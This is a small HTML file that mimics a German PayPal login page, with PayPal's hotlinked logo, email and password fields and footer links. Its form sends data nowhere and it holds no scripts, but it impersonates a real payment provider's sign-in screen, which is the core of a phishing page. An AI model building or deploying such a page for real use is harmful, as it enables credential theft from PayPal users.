<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PayPal Login</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="login-container">
    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo" class="logo">

    <form class="login-form">
      <input type="text" placeholder="E-Mail-Adresse oder Handynummer" required>
      <input type="password" placeholder="Passwort" required>
      <a href="#" class="forgot-password">Passwort vergessen?</a>
      <button type="submit" class="login-button">Einloggen</button>
      <div class="divider">oder</div>
      <button type="button" class="signup-button">Neu anmelden</button>
    </form>

    <div class="language-selector">
      <img src="https://flagcdn.com/de.svg" alt="DE" class="flag">
      <span>Deutsch</span> | <a href="#">English</a>
    </div>

    <footer>
      <a href="#">Kontakt</a>
      <a href="#">Datenschutz</a>
      <a href="#">AGB</a>
      <a href="#">Weltweit</a>
    </footer>
  </div>
</body>
</html>
